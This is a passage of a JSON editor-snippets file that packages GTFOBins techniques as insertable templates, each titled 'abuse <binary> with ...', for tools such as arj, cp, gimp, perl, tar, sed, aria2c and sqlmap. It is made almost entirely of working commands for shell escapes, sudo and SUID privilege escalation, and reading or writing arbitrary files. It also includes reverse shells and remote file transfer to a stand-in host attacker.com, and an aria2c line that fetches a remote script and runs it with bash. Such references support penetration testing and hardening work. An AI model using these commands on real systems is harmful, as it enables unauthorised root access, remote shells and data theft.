            "LFILE=${1:file_to_read}",
            "arj a \"\\$TF\" \"\\$LFILE\"",
            "arj p \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse arj with file-read - The file appears amid some other textual information. The archive can also be downloaded then extracted offline."
    },
    "arj file-write (gtfobins)": {
        "prefix": "arj file-write",
        "body": [
            "abuse arj with file-write, The archive can also be prepared offline then uploaded.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\"\\$TF/\\$LFILE\"",
            "arj a \"\\$TF/a\" \"\\$TF/\\$LFILE\"",
            "arj e \"\\$TF/a\" \\$LDIR${0}",
            "```"
        ],
        "description": "abuse arj with file-write - The archive can also be prepared offline then uploaded."
    },
    "arj sudo (gtfobins)": {
        "prefix": "arj sudo",
        "body": [
            "abuse arj with sudo, The archive can also be prepared offline then uploaded.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\"\\$TF/\\$LFILE\"",
            "arj a \"\\$TF/a\" \"\\$TF/\\$LFILE\"",
            "sudo arj e \"\\$TF/a\" \\$LDIR${0}",
            "```"
        ],
        "description": "abuse arj with sudo - The archive can also be prepared offline then uploaded."
    },
    "arj suid (gtfobins)": {
        "prefix": "arj suid",
        "body": [
            "abuse arj with suid, The archive can also be prepared offline then uploaded.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\"\\$TF/\\$LFILE\"",
            "arj a \"\\$TF/a\" \"\\$TF/\\$LFILE\"",
            "./arj e \"\\$TF/a\" \\$LDIR${0}",
            "```"
        ],
        "description": "abuse arj with suid - The archive can also be prepared offline then uploaded."
    },
    "cp file-read (gtfobins)": {
        "prefix": "cp file-read",
        "body": [
            "abuse cp with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cp \"\\$LFILE\" /dev/stdout${0}",
            "```"
        ],
        "description": "abuse cp with file-read"
    },
    "cp file-write (gtfobins)": {
        "prefix": "cp file-write",
        "body": [
            "abuse cp with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"DATA\" | cp /dev/stdin \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cp with file-write"
    },
    "cp suid (gtfobins)": {
        "prefix": "cp suid",
        "body": [
            "abuse cp with suid, This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "./cp --attributes-only --preserve=all ./cp \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cp with suid - This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another."
    },
    "cp sudo (gtfobins)": {
        "prefix": "cp sudo",
        "body": [
            "abuse cp with sudo, This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.",
            "",
            "```sh",
            "sudo cp /bin/sh /bin/cp",
            "sudo cp${0}",
            "```"
        ],
        "description": "abuse cp with sudo - This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action."
    },
    "lualatex shell (gtfobins)": {
        "prefix": "lualatex shell",
        "body": [
            "abuse lualatex with shell",
            "",
            "```sh",
            "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse lualatex with shell"
    },
    "lualatex sudo (gtfobins)": {
        "prefix": "lualatex sudo",
        "body": [
            "abuse lualatex with sudo",
            "",
            "```sh",
            "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse lualatex with sudo"
    },
    "lualatex limited-suid (gtfobins)": {
        "prefix": "lualatex limited-suid",
        "body": [
            "abuse lualatex with limited-suid",
            "",
            "```sh",
            "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse lualatex with limited-suid"
    },
    "luatex shell (gtfobins)": {
        "prefix": "luatex shell",
        "body": [
            "abuse luatex with shell",
            "",
            "```sh",
            "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'${0}",
            "```"
        ],
        "description": "abuse luatex with shell"
    },
    "luatex sudo (gtfobins)": {
        "prefix": "luatex sudo",
        "body": [
            "abuse luatex with sudo",
            "",
            "```sh",
            "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'${0}",
            "```"
        ],
        "description": "abuse luatex with sudo"
    },
    "luatex limited-suid (gtfobins)": {
        "prefix": "luatex limited-suid",
        "body": [
            "abuse luatex with limited-suid",
            "",
            "```sh",
            "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'${0}",
            "```"
        ],
        "description": "abuse luatex with limited-suid"
    },
    "gimp shell (gtfobins)": {
        "prefix": "gimp shell",
        "body": [
            "abuse gimp with shell",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'${0}",
            "```"
        ],
        "description": "abuse gimp with shell"
    },
    "gimp reverse-shell (gtfobins)": {
        "prefix": "gimp reverse-shell",
        "body": [
            "abuse gimp with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse gimp with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "gimp file-upload (gtfobins)": {
        "prefix": "gimp file-upload",
        "body": [
            "abuse gimp with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'${0}",
            "```"
        ],
        "description": "abuse gimp with file-upload - Serve files in the local folder running an HTTP server."
    },
    "gimp file-download (gtfobins)": {
        "prefix": "gimp file-download",
        "body": [
            "abuse gimp with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse gimp with file-download - Fetch a remote file via HTTP GET request."
    },
    "gimp file-write (gtfobins)": {
        "prefix": "gimp file-write",
        "body": [
            "abuse gimp with file-write",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"${1:file_to_write}\", \"wb\").write(\"DATA\")'${0}",
            "```"
        ],
        "description": "abuse gimp with file-write"
    },
    "gimp file-read (gtfobins)": {
        "prefix": "gimp file-read",
        "body": [
            "abuse gimp with file-read",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"${1:file_to_read}\").read())'${0}",
            "```"
        ],
        "description": "abuse gimp with file-read"
    },
    "gimp library-load (gtfobins)": {
        "prefix": "gimp library-load",
        "body": [
            "abuse gimp with library-load",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'${0}",
            "```"
        ],
        "description": "abuse gimp with library-load"
    },
    "gimp suid (gtfobins)": {
        "prefix": "gimp suid",
        "body": [
            "abuse gimp with suid",
            "",
            "```sh",
            "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${0}",
            "```"
        ],
        "description": "abuse gimp with suid"
    },
    "gimp sudo (gtfobins)": {
        "prefix": "gimp sudo",
        "body": [
            "abuse gimp with sudo",
            "",
            "```sh",
            "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'${0}",
            "```"
        ],
        "description": "abuse gimp with sudo"
    },
    "c99 file-read (gtfobins)": {
        "prefix": "c99 file-read",
        "body": [
            "abuse c99 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "c99 -x c -E \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse c99 with file-read"
    },
    "c99 file-write (gtfobins)": {
        "prefix": "c99 file-write",
        "body": [
            "abuse c99 with file-write",
            "",
            "```sh",
            "LFILE=file_to_delete",
            "c99 -xc /dev/null -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse c99 with file-write"
    },
    "c99 shell (gtfobins)": {
        "prefix": "c99 shell",
        "body": [
            "abuse c99 with shell",
            "",
            "```sh",
            "c99 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c99 with shell"
    },
    "c99 sudo (gtfobins)": {
        "prefix": "c99 sudo",
        "body": [
            "abuse c99 with sudo",
            "",
            "```sh",
            "sudo c99 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c99 with sudo"
    },
    "chroot suid (gtfobins)": {
        "prefix": "chroot suid",
        "body": [
            "abuse chroot with suid",
            "",
            "```sh",
            "./chroot / /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse chroot with suid"
    },
    "chroot sudo (gtfobins)": {
        "prefix": "chroot sudo",
        "body": [
            "abuse chroot with sudo",
            "",
            "```sh",
            "sudo chroot /${0}",
            "```"
        ],
        "description": "abuse chroot with sudo"
    },
    "xmodmap file-read (gtfobins)": {
        "prefix": "xmodmap file-read",
        "body": [
            "abuse xmodmap with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xmodmap -v \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmodmap with file-read"
    },
    "xmodmap suid (gtfobins)": {
        "prefix": "xmodmap suid",
        "body": [
            "abuse xmodmap with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xmodmap -v \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmodmap with suid"
    },
    "xmodmap sudo (gtfobins)": {
        "prefix": "xmodmap sudo",
        "body": [
            "abuse xmodmap with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xmodmap -v \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmodmap with sudo"
    },
    "pandoc file-read (gtfobins)": {
        "prefix": "pandoc file-read",
        "body": [
            "abuse pandoc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pandoc -t plain \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pandoc with file-read"
    },
    "pandoc file-write (gtfobins)": {
        "prefix": "pandoc file-write",
        "body": [
            "abuse pandoc with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | pandoc -t plain -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pandoc with file-write"
    },
    "pandoc shell (gtfobins)": {
        "prefix": "pandoc shell",
        "body": [
            "abuse pandoc with shell, Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "pandoc -L \\$TF /dev/null${0}",
            "```"
        ],
        "description": "abuse pandoc with shell - Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
    },
    "pandoc suid (gtfobins)": {
        "prefix": "pandoc suid",
        "body": [
            "abuse pandoc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | ./pandoc -t plain -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pandoc with suid"
    },
    "pandoc limited-suid (gtfobins)": {
        "prefix": "pandoc limited-suid",
        "body": [
            "abuse pandoc with limited-suid, Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "./pandoc -L \\$TF /dev/null${0}",
            "```"
        ],
        "description": "abuse pandoc with limited-suid - Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
    },
    "pandoc sudo (gtfobins)": {
        "prefix": "pandoc sudo",
        "body": [
            "abuse pandoc with sudo, Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "sudo pandoc -L \\$TF /dev/null${0}",
            "```"
        ],
        "description": "abuse pandoc with sudo - Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
    },
    "perl shell (gtfobins)": {
        "prefix": "perl shell",
        "body": [
            "abuse perl with shell",
            "",
            "```sh",
            "perl -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with shell"
    },
    "perl file-read (gtfobins)": {
        "prefix": "perl file-read",
        "body": [
            "abuse perl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "perl -ne print \\$LFILE${0}",
            "```"
        ],
        "description": "abuse perl with file-read"
    },
    "perl reverse-shell (gtfobins)": {
        "prefix": "perl reverse-shell",
        "body": [
            "abuse perl with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "perl -e 'use Socket;\\$i=\"\\$ENV{RHOST}\";\\$p=\\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${0}",
            "```"
        ],
        "description": "abuse perl with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "perl suid (gtfobins)": {
        "prefix": "perl suid",
        "body": [
            "abuse perl with suid",
            "",
            "```sh",
            "./perl -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with suid"
    },
    "perl sudo (gtfobins)": {
        "prefix": "perl sudo",
        "body": [
            "abuse perl with sudo",
            "",
            "```sh",
            "sudo perl -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with sudo"
    },
    "perl capabilities (gtfobins)": {
        "prefix": "perl capabilities",
        "body": [
            "abuse perl with capabilities",
            "",
            "```sh",
            "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with capabilities"
    },
    "mtr file-read (gtfobins)": {
        "prefix": "mtr file-read",
        "body": [
            "abuse mtr with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "mtr --raw -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mtr with file-read"
    },
    "mtr sudo (gtfobins)": {
        "prefix": "mtr sudo",
        "body": [
            "abuse mtr with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo mtr --raw -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mtr with sudo"
    },
    "sort file-read (gtfobins)": {
        "prefix": "sort file-read",
        "body": [
            "abuse sort with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sort -m \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sort with file-read"
    },
    "sort suid (gtfobins)": {
        "prefix": "sort suid",
        "body": [
            "abuse sort with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./sort -m \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sort with suid"
    },
    "sort sudo (gtfobins)": {
        "prefix": "sort sudo",
        "body": [
            "abuse sort with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo sort -m \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sort with sudo"
    },
    "man shell (gtfobins)": {
        "prefix": "man shell",
        "body": [
            "abuse man with shell, This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).",
            "",
            "```sh",
            "man '-H/bin/sh #' man${0}",
            "```"
        ],
        "description": "abuse man with shell - This only works for GNU `man` and requires GNU `troff` (`groff` to be installed)."
    },
    "man file-read (gtfobins)": {
        "prefix": "man file-read",
        "body": [
            "abuse man with file-read",
            "",
            "```sh",
            "man ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse man with file-read"
    },
    "man sudo (gtfobins)": {
        "prefix": "man sudo",
        "body": [
            "abuse man with sudo",
            "",
            "```sh",
            "sudo man man",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse man with sudo"
    },
    "cat file-read (gtfobins)": {
        "prefix": "cat file-read",
        "body": [
            "abuse cat with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cat with file-read"
    },
    "cat suid (gtfobins)": {
        "prefix": "cat suid",
        "body": [
            "abuse cat with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cat with suid"
    },
    "cat sudo (gtfobins)": {
        "prefix": "cat sudo",
        "body": [
            "abuse cat with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cat with sudo"
    },
    "tar shell (gtfobins)": {
        "prefix": "tar shell",
        "body": [
            "abuse tar with shell, This only works for GNU tar. It can be useful when only a limited command argument injection is available.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '/bin/sh 0<&1' > \"\\$TF\"",
            "tar cf \"\\$TF.tar\" \"\\$TF\"",
            "tar xf \"\\$TF.tar\" --to-command sh",
            "rm \"\\$TF\"*${0}",
            "```"
        ],
        "description": "abuse tar with shell - This only works for GNU tar. It can be useful when only a limited command argument injection is available."
    },
    "tar file-upload (gtfobins)": {
        "prefix": "tar file-upload",
        "body": [
            "abuse tar with file-upload, This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RUSER=root",
            "RFILE=/tmp/${1:file_to_send}.tar",
            "LFILE=${1:file_to_send}",
            "tar cvf \\$RUSER@\\$RHOST:\\$RFILE \\$LFILE --rsh-command=/bin/ssh${0}",
            "```"
        ],
        "description": "abuse tar with file-upload - This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions)."
    },
    "tar file-download (gtfobins)": {
        "prefix": "tar file-download",
        "body": [
            "abuse tar with file-download, This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RUSER=root",
            "RFILE=/tmp/file_to_get.tar",
            "tar xvf \\$RUSER@\\$RHOST:\\$RFILE --rsh-command=/bin/ssh${0}",
            "```"
        ],
        "description": "abuse tar with file-download - This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions)."
    },
    "tar file-write (gtfobins)": {
        "prefix": "tar file-write",
        "body": [
            "abuse tar with file-write, This only works for GNU tar.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA > \"\\$TF\"",
            "tar c --xform \"s@.*@\\$LFILE@\" -OP \"\\$TF\" | tar x -P${0}",
            "```"
        ],
        "description": "abuse tar with file-write - This only works for GNU tar."
    },
    "tar file-read (gtfobins)": {
        "prefix": "tar file-read",
        "body": [
            "abuse tar with file-read, This only works for GNU tar.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tar xf \"\\$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'${0}",
            "```"
        ],
        "description": "abuse tar with file-read - This only works for GNU tar."
    },
    "tar sudo (gtfobins)": {
        "prefix": "tar sudo",
        "body": [
            "abuse tar with sudo",
            "",
            "```sh",
            "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh${0}",
            "```"
        ],
        "description": "abuse tar with sudo"
    },
    "tar limited-suid (gtfobins)": {
        "prefix": "tar limited-suid",
        "body": [
            "abuse tar with limited-suid",
            "",
            "```sh",
            "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh${0}",
            "```"
        ],
        "description": "abuse tar with limited-suid"
    },
    "nft file-read (gtfobins)": {
        "prefix": "nft file-read",
        "body": [
            "abuse nft with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nft -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nft with file-read"
    },
    "nft suid (gtfobins)": {
        "prefix": "nft suid",
        "body": [
            "abuse nft with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nft -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nft with suid"
    },
    "nft sudo (gtfobins)": {
        "prefix": "nft sudo",
        "body": [
            "abuse nft with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nft -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nft with sudo"
    },
    "msgcat file-read (gtfobins)": {
        "prefix": "msgcat file-read",
        "body": [
            "abuse msgcat with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgcat -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgcat with file-read"
    },
    "msgcat sudo (gtfobins)": {
        "prefix": "msgcat sudo",
        "body": [
            "abuse msgcat with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgcat -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgcat with sudo"
    },
    "msgcat suid (gtfobins)": {
        "prefix": "msgcat suid",
        "body": [
            "abuse msgcat with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgcat -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgcat with suid"
    },
    "sudo sudo (gtfobins)": {
        "prefix": "sudo sudo",
        "body": [
            "abuse sudo with sudo",
            "",
            "```sh",
            "sudo sudo /bin/sh${0}",
            "```"
        ],
        "description": "abuse sudo with sudo"
    },
    "dos2unix file-write (gtfobins)": {
        "prefix": "dos2unix file-write",
        "body": [
            "abuse dos2unix with file-write",
            "",
            "```sh",
            "LFILE1=${1:file_to_read}",
            "LFILE2=${2:file_to_write}",
            "dos2unix -f -n \"\\$LFILE1\" \"\\$LFILE2\"${0}",
            "```"
        ],
        "description": "abuse dos2unix with file-write"
    },
    "aria2c command (gtfobins)": {
        "prefix": "aria2c command",
        "body": [
            "abuse aria2c with command, The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",
            "",
            "```sh",
            "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://${1:attacker.com}/aaaaaaaaaaaaaaaa${0}",
            "```"
        ],
        "description": "abuse aria2c with command - The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID."
    },
    "aria2c file-download (gtfobins)": {
        "prefix": "aria2c file-download",
        "body": [
            "abuse aria2c with file-download, Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "aria2c -o \"\\$LFILE\" \"\\$URL\"${0}",
            "```"
        ],
        "description": "abuse aria2c with file-download - Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed."
    },
    "aria2c sudo (gtfobins)": {
        "prefix": "aria2c sudo",
        "body": [
            "abuse aria2c with sudo",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "sudo aria2c --on-download-error=\\$TF http://x${0}",
            "```"
        ],
        "description": "abuse aria2c with sudo"
    },
    "aria2c limited-suid (gtfobins)": {
        "prefix": "aria2c limited-suid",
        "body": [
            "abuse aria2c with limited-suid",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "./aria2c --on-download-error=\\$TF http://x${0}",
            "```"
        ],
        "description": "abuse aria2c with limited-suid"
    },
    "sqlmap shell (gtfobins)": {
        "prefix": "sqlmap shell",
        "body": [
            "abuse sqlmap with shell",
            "",
            "```sh",
            "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"${0}",
            "```"
        ],
        "description": "abuse sqlmap with shell"
    },
    "sqlmap sudo (gtfobins)": {
        "prefix": "sqlmap sudo",
        "body": [
            "abuse sqlmap with sudo",
            "",
            "```sh",
            "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"${0}",
            "```"
        ],
        "description": "abuse sqlmap with sudo"
    },
    "unzip sudo (gtfobins)": {
        "prefix": "unzip sudo",
        "body": [
            "abuse unzip with sudo",
            "",
            "```sh",
            "sudo unzip -K shell.zip",
            "./sh -p${0}",
            "```"
        ],
        "description": "abuse unzip with sudo"
    },
    "unzip suid (gtfobins)": {
        "prefix": "unzip suid",
        "body": [
            "abuse unzip with suid",
            "",
            "```sh",
            "./unzip -K shell.zip",
            "./sh -p${0}",
            "```"
        ],
        "description": "abuse unzip with suid"
    },
    "shuf file-read (gtfobins)": {
        "prefix": "shuf file-read",
        "body": [
            "abuse shuf with file-read, The read file content is corrupted by randomizing the order of NUL terminated strings.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "shuf -z \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with file-read - The read file content is corrupted by randomizing the order of NUL terminated strings."
    },
    "shuf file-write (gtfobins)": {
        "prefix": "shuf file-write",
        "body": [
            "abuse shuf with file-write, The written file content is corrupted by adding a newline.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "shuf -e DATA -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with file-write - The written file content is corrupted by adding a newline."
    },
    "shuf suid (gtfobins)": {
        "prefix": "shuf suid",
        "body": [
            "abuse shuf with suid, The written file content is corrupted by adding a newline.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "./shuf -e DATA -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with suid - The written file content is corrupted by adding a newline."
    },
    "shuf sudo (gtfobins)": {
        "prefix": "shuf sudo",
        "body": [
            "abuse shuf with sudo, The written file content is corrupted by adding a newline.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sudo shuf -e DATA -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with sudo - The written file content is corrupted by adding a newline."
    },
    "sed shell (gtfobins)": {
        "prefix": "sed shell",
        "body": [
            "abuse sed with shell, GNU version only. The resulting shell is not a proper TTY shell.",
            "",
            "```sh",
            "sed e${0}",
            "```"
        ],
        "description": "abuse sed with shell - GNU version only. The resulting shell is not a proper TTY shell."
    },
    "sed command (gtfobins)": {
        "prefix": "sed command",
        "body": [
            "abuse sed with command, GNU version only.",
            "",
            "```sh",
            "sed -n '1e id' /etc/hosts${0}",
            "```"
        ],
        "description": "abuse sed with command - GNU version only."
    },
    "sed file-write (gtfobins)": {
        "prefix": "sed file-write",
        "body": [
            "abuse sed with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sed -n \"1s/.*/DATA/w \\$LFILE\" /etc/hosts${0}",
            "```"
        ],
        "description": "abuse sed with file-write"
    },
    "sed file-read (gtfobins)": {
        "prefix": "sed file-read",
        "body": [
            "abuse sed with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sed '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sed with file-read"
    },
    "sed suid (gtfobins)": {
        "prefix": "sed suid",
        "body": [
            "abuse sed with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./sed -e '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sed with suid"
    },
    "sed sudo (gtfobins)": {
        "prefix": "sed sudo",
        "body": [
            "abuse sed with sudo, GNU version only. Also, this requires `bash`.",
            "",
            "```sh",
            "sudo sed -n '1e exec sh 1>&0' /etc/hosts${0}",
            "```"
        ],
        "description": "abuse sed with sudo - GNU version only. Also, this requires `bash`."
    },
    "ncdu shell (gtfobins)": {
        "prefix": "ncdu shell",
        "body": [
            "abuse ncdu with shell",
            "",
            "```sh",
            "ncdu",
            "b${0}",
            "```"
        ],
        "description": "abuse ncdu with shell"
    },
